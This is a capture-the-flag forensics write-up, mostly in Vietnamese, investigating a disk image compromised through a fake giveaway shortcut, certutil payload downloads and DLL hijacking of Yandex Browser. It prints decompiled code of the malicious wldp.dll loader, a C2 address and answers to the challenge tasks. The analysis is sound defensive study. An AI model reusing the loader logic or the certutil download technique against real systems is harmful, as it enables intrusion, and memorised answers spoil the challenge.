<img width="1620" height="799" alt="image" src="https://github.com/user-attachments/assets/48e823ed-98f4-4cc7-a5eb-7dff32be3720" />

# Easy Money Sherlock

### Scenario: 
John is an employee at a mid-sized tech company. He works as a Senior IT support specialist, but his true passion is finding ways to make extra money. John is always on the lookout for giveaways, discounts, and any opportunity to earn a quick buck. He’s not particularly tech-savvy when it comes to cybersecurity, but he’s resourceful and knows how to follow online tutorials.
Recently, John came across an enticing giveaway that promised exciting rewards. However, when he opened the giveaway, he didn’t find or win anything. This made him suspicious that something might have gone wrong with his machine. Concerned about the unusual behavior, John has reached out to you, the investigator, to uncover what happened and whether his system has been compromised.


### Skill: 
- Trace log file `.evtx` Windows
- Use common artifact like: $MFT, $J, Prefetch
- Golang Reverse Malware

Challenge này sẽ cung cấp cho chúng ta artifact là 1 disk image của victim đã bị lừa download về 1 malicious file để có thể trúng thưởng, và thấy các hành vi lạ trên máy tính, task hiện tại là cần phải thu thập các evidence đã có trong máy tính, dựng lại context và truy ra file malicious trong hệ thống.

### Task 1: At what exact time did the user execute the malicious shortcut file?

Chúng ta xem qua một số file shortcut có trong phần recent trước:

<img width="1217" height="459" alt="image" src="https://github.com/user-attachments/assets/9b1a00f6-dcf1-46fe-b8f5-3fb80472c1e6" />

Ở đây mình có thể nghi ngờ tạm đầu tiên vào file `Ultimate-Guide-to-Running-Giveaway.pdf.lnk`, nhưng mình sẽ tiếp tục check trong folder custom shortcut, có thể được tạo thủ công của attacker

<img width="1223" height="739" alt="image" src="https://github.com/user-attachments/assets/91590b0e-df04-4089-b798-ae4adfc7435d" />

Tiếp tục sẽ thấy được 1 file khác tên là `2025-Giveaway.lnk` không biết file này type file là gì, vì không có phần extention, nên có thấy nó khá sú, mình sẽ đi sâu hơn vào file Journaling và Registry để check tiếp. 

Đầu tiên là Journaling file:

<img width="1892" height="232" alt="image" src="https://github.com/user-attachments/assets/b61a9001-49e9-4ba8-863c-90bc523ea065" />

Chúng ta có thể thấy bên trong có chính xác các timeline mà file lnk được tạo, và thay đổi phần metadata, nhưng đây chưa đủ để chứng minh rằng đây chính là time chính xác mà file được execute, nên mình tiếp tục dựa vào 1 artifact khác trong registry là **UserAssists** - Registry Key này sẽ ghi lại các app mà từng được user chạy, gồm cả count và focus time:

<img width="1243" height="500" alt="image" src="https://github.com/user-attachments/assets/ebc29a0f-a15f-437b-b5bb-12a25887211f" />

Tới đây mình có thể lấy được timeline chính xác mà file malicious này được execute trên máy của vicitm.

-> `2025-01-26 16:17:15`

### Task2: The previous malicious file executed an initial payload. What is the full path of this payload?

Dựa vào khoảng timeline, initial attack bắt đầu vào lúc: `2025-01-26 16:17:15`, mình tiếp tục truy vào parsing của file $MFT:

<img width="1437" height="314" alt="Screenshot 2026-08-04 143943" src="https://github.com/user-attachments/assets/542a898e-8682-4d4f-9a53-6ff321d23c77" />

Từ file shortcut malicious đấy có vẻ như đã installed 1 file PE khác nằm trong thư mục TEMP, với tên fake với tiến trình `svchost.exe`, và đã được thực thi khi được log lại từ Prefetch.

-> `C:\Temp\svch0st.exe`

### Task 3: At what timestamp did the payload execute and grant the attacker shell access?

Chúng ta cũng biết được timestamp mà payload được execute là -> `2025-01-26 16:17:54`

### Task 4: What is the command line the attacker used to enumerate installed packages on the system?

Lúc này attacker đã có thể chiếm được quyền sử dụng shell trong hệ thống, nên mình cần phải trace event log Powershell.evtx để tiếp tục xem các hành vi của attacker, và để liệt kê các package trong Windows, mình có thể dùng lệnh `Get-Package` để liệt kê toàn bộ các package đã được install

Khi mình trace trong timeline từ lúc payload thứ 2 được execute, mình sẽ có thể thấy được các command: `powershell.exe -NoExit -Command [Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8 -> dùng để chuyển output command thành dạng UTF-8`, và vào timestamp `26/01/2025 23:19:29` là lúc attacker try to enumerate package install on victim system:

<img width="1230" height="682" alt="image" src="https://github.com/user-attachments/assets/d5a6fe3d-a480-42cc-a008-9e856e1ab28e" />

-> `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command Get-Package`

### Task 5: Which application did the attacker identify as vulnerable?

Khi chúng ta thử explore thêm về máy của victim, về các artifact khác như history browser, hoặc trong UserAssist, mình có thể thấy được có một số software được tìm thấy bên trong này:

Như ở trong artifact browser History, mình có thể tìm thấy được YandexSoftware -> một application browser 

<img width="1916" height="713" alt="image" src="https://github.com/user-attachments/assets/5b3ebaf5-55da-42bf-a941-2bf5a5c07738" />

Search bên trong UserAssists mình có thể thấy thêm về software Foxit PDF Reader -> một phần mềm dùng để đọc các định dạng pdf

Cả 2 khi chúng ta googling đều có các vullnerable, nhưng đối với YandexBrowser, thì mình còn có thêm được version của app bên trong registry Key **Uninstalled**, và biết được lỗ hổng được khai thác trong version này của liên quan đến việc cho phép attacker có thể load một untrusted path của dll, dẫn đến cuộc tấn công **dll hijacking**, còn đối với Foxit Pdf Reader nó liên quan đến khai thác lỗi từ buffer overflow, hoặc allow javascript execute. Dựa vào đặc thù của 2 lổ hổng này mình tìm kiếm các file được tải xuống trong khoảng timeline đã có:

<img width="1774" height="344" alt="image" src="https://github.com/user-attachments/assets/5ebe6f8b-6b52-469e-81bf-0e5d949e0331" />

Sau 1 lúc tìm kiếm, thì mình thấy được ở đây có file `.dll` và 1 file tmp được tải xuống, đặc biệt hơn là file `.dll` lại còn được nằm trong folder Application của YandexBrowser rất giống với việc tạo một unstrusted path cho 1 cuộc tấn công dll hijacking, còn lại là 1 file `yanda.tmp` cũng được tải xuống sau đó. Hơn nữa là cả 2 file này đều được tải bằng `certutil.exe` 1 tools legit của Microsoft cho phép remote download payload, và khi mình check bên trong prefetch

<img width="1774" height="344" alt="image" src="https://github.com/user-attachments/assets/2934d525-aad5-40ba-9ad4-2a6d68ec51c9" />

<img width="1052" height="50" alt="image" src="https://github.com/user-attachments/assets/493e24d8-e43c-41d0-bfb6-f6590ccbc426" />

Như ở đây chúng ta có thể thấy thời gian được tải xuống của file dll và file tmp gần như trùng khớp với khoảng thời gian process `certutil.exe` được ghi lại trong pf. Càng prove được software bị khai thác ở đây là YandexBrowser

-> `YandexBrowser`

### Task 6: What version of that vulnerable application did the attacker identify?

<img width="1266" height="823" alt="image" src="https://github.com/user-attachments/assets/26a40306-fea0-4654-b665-3a14aeeb9924" />

-> `24.4.5.498`

### Task 7: What is the CVE associated with this vulnerability?

Googling -> CVE-2024-6473

<img width="1484" height="686" alt="image" src="https://github.com/user-attachments/assets/3d454a09-3f6f-4a4d-af18-5f32fc5d9624" />

### Task 8: What is the name of the legitimate binary that the attacker used to deliver the malicious payload and establish persistence on the compromised system?

> Certutil.exe là một công cụ legit của microsoft thường dùng cho các dev để debug lỗi từ xa bằng cách tải xuống các phần mểm remote, nhưng mà dựa vào tính năng này nó cũng được các attacker thường sử dụng cho việc download payload từ xa, mà không làm lộ domain download.

-> `Certutil.exe`

### Task 9: What is the name of the malicious Portable Executable (PE) file that enabled him to accomplish his objective?

Chính là file dll malicious được tải xuống đầu tiên: -> `wldp.dll`

### Task 10: What is the SHA-256 hash of that malicious file?

Ở đây khi chúng ta để ý lại vào lúc certutil.exe download xuống 2 file payload, mình thấy các hash file name như: `A16B2E6DE64B13EDF2C00F32C4559930` và `DE69F438F13416BEDB3F9D0DBC8165A8`, nằm trong thư mục `CryptNetUrlCache\Content`, có length size của file trùng khớp với file `wldp.dll` và `yanda.tmp` kết hợp cùng với artifact Journaling:

<img width="1690" height="415" alt="image" src="https://github.com/user-attachments/assets/758453ab-0443-4da9-89be-ea613f1b87cf" />

Thời gian 2 file được create gần như là như nhau, nên mình nghĩ là nội dung của file gốc khi được tải xuống từ `certutil.exe` sẽ được lưu trong folder `CryptNetUrlCache\Content`, sau đó attacker mới thực hiện copy sang 1 file dll khác với tên là file dll của yandex browser, để thực hiện 1 cuộc tấn công dll hijacking.

<img width="1219" height="572" alt="image" src="https://github.com/user-attachments/assets/8f541e15-c728-42ef-9515-e2a3e47290e9" />

Khi vào folder `LocalLow\Microsoft\CryptNetUrlCache\Content` mình có thể thấy ngay được 2 byte đầu tiên của file `A16B2E6DE64B13EDF2C00F32C4559930` là `MZ` chính là signature byte của 1 file PE executable -> prove được file này chính là file dll malicious trong $MFT được dùng cho dll hijacking. Giờ mình cần extract nó ra ròi lấy sha256sum là được:

-> `A1A17EBD90610D808E761811D17DA3143F3DE0D4CC5EE92BD66000DCA87D9270`

### Task 11: How many milliseconds of cumulative coded sleep delays occurred before the C2 binary provided a shell after the vulnerable application was launched?

Tới đây thì khả năng reverse của mình chưa được cải thiện nhiều, nên mình chỉ thực hiện reverse sơ qua một chút về hàm đóng vai trò thực hiện create process, sleep delays, terminate process,... bên trong malicious dll (`wldp.dll`). Đầu tiên mình thực hiện detect nó bằng **DIE** để xem nó được compiler bằng ngôn ngữ gì:

<img width="909" height="663" alt="image" src="https://github.com/user-attachments/assets/533655d3-4bca-49e9-b349-94a1bf5702a8" />

Giờ mở IDA để reverse:

<details>
  <summary>
    Func_Main()
  </summary>

```C++
__int64 sleep_mutex()
{
  char *v0; // rdi
  __int64 i; // rcx
  HWND WindowW; // rax
  HANDLE CurrentProcess; // rax
  _BYTE v5[32]; // [rsp+0h] [rbp-50h] BYREF
  char v6; // [rsp+50h] [rbp+0h] BYREF
  HANDLE hObject; // [rsp+58h] [rbp+8h]
  struct _STARTUPINFOW StartupInfo; // [rsp+80h] [rbp+30h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [rsp+108h] [rbp+B8h] BYREF
  struct _STARTUPINFOW lpStartupInfo; // [rsp+140h] [rbp+F0h] BYREF
  struct _PROCESS_INFORMATION lpProcessInformation; // [rsp+1C8h] [rbp+178h] BYREF
  HWND v12; // [rsp+1F8h] [rbp+1A8h]
  char v13; // [rsp+2D4h] [rbp+284h]

  v0 = &v6;
  for ( i = 130; i; --i )
  {
    *(_DWORD *)v0 = -858993460;
    v0 += 4;
  }
  v13 = 0;
  sub_180070FA3(&unk_18019909F);
  hObject = CreateMutexW(0, 1, L"Global\\YandaExeMutex");
  if ( !hObject
    || GetLastError() == 183
    || (StartupInfo.cb = 104,
        memset(&StartupInfo.lpReserved, 0, 0x60u),
        lpStartupInfo.cb = 104,
        memset(&lpStartupInfo.lpReserved, 0, 0x60u),
        (v12 = FindWindowW(0, L"Yandex Browser")) != 0) )
  {
    CloseHandle(hObject);
  }
  else
  {
    CreateProcessW(
      L"C:\\Users\\Administrator\\AppData\\Local\\Yandex\\YandexBrowser\\Application\\browser.exe",
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      &StartupInfo,
      &ProcessInformation);
    Sleep(0x2710u);
    WindowW = FindWindowW(0, L"yanda.tmp");
    v12 = WindowW;
    if ( !WindowW )
    {
      v13 = 1;
      CreateProcessW(
        L"C:\\Users\\Administrator\\AppData\\Local\\Temp\\yanda.tmp",
        0,
        0,
        0,
        1,
        0,
        0,
        0,
        &lpStartupInfo,
        &lpProcessInformation);
      Sleep(0x3E8u);
    }
    CloseHandle(ProcessInformation.hProcess);
    CloseHandle(ProcessInformation.hThread);
    if ( !v13 )
      sub_18006E7BC("proc_info2");
    CloseHandle(lpProcessInformation.hProcess);
    CloseHandle(lpProcessInformation.hThread);
    CloseHandle(hObject);
    CurrentProcess = GetCurrentProcess();
    TerminateProcess(CurrentProcess, 0);
  }
  return sub_180070742(v5, &unk_180155D10);
}
```
</details>

Toàn bộ hàm này thực hiện các hành vi sau:
- Đầu tiên là tạo mutex để điều khiển 1 instance duy nhất được spawn cho c2 server
- Thực hiện CreateProcess, cho malware thực hiện kết nối đến c2 server
- Tạo thời gian delays sleep bên trong 2 hàm `Sleep(0x2710u) -> 10000ms` & `Sleep(0x3E8u) -> 1000ms`
- Close các handled hiện tại và terminated process

-> Thời gian delays -> 10000 + 1000 = 11000ms

### Task 12 What is the mutex name used to ensure only one instance of the C2 binary runs at a time?

-> Global\\YandaExeMutex

### Task 13: What is the full path of the Command and Control (C2) Binary?

Chúng ta có thể lấy được từ source main func của dll trên, hoặc lấy được từ MFT 

-> C:\Users\Administrator\AppData\Local\Temp\yanda.tmp

### Task 14: What is the name of the C2 framework used by the attacker?

Framework của C2 server mình lấy được từ virustotal:

<img width="1579" height="449" alt="image" src="https://github.com/user-attachments/assets/7f0bc721-484e-4504-959c-eb8e8913e2ee" />

-> sliver

### Task 15: What is the IP address and port number of the malicious C2 server used by the attacker?

-> 18.192.12.126:8888

